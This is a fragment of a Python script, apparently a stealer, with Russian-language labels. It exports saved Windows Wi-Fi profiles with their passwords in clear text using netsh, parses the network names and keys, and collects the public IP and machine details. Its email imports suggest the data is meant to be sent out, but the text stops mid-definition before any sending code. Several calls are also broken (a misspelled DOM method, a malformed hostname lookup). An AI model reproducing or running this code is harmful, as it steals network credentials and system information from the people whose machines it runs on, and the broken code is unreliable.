import  subprocess as sp
from xml.dom import minidom
import requests
from time import sleep
import platform as pf
import  smtplib
from email.mime.text import MIMEText
from email.mime.multipart import  MIMEMultipart
import socket

sp.call('netsh wlan show profile')
sp.call('netsh wlan export profile folder=C:\ key=clear')


def wifi_parse():
    doc = minidom.parse('Беспроводная сеть-Frunze 2')
    wifi_name = doc.getElementByTagName('name')
    wifi_password = doc.getElementByTagName('keyMaterial')
    global  data
    data = f'wifi name: {wifi_name}\nWifi password:{wifi_password}'

def get_ip():
    response = requests.get('http://myip.dnsomatic.com')
    ip = response.text
    global data_ip
    data_ip = f'IP ADDRESS:{ip}'
def info_pc():
    processor = pf.processor()
    name_sys = pf.system() + '' + pf.release()
    net_pc = pf.node()
    ip_pc = socket.gethostbyname(socket.gethostbyname())

    global data_pc
    data_pc = f'''
    Процессор : {processor}\n
    Система : {name_sys}\n
    Сетевое имя ПК : {net_pc}\n
    IP ADDRESS ПК :{ip_pc}\n
    '''
def all_info():
    global  data_all_info
    data_all_info = f'{data}\n{data_ip }\n{data_pc}'

def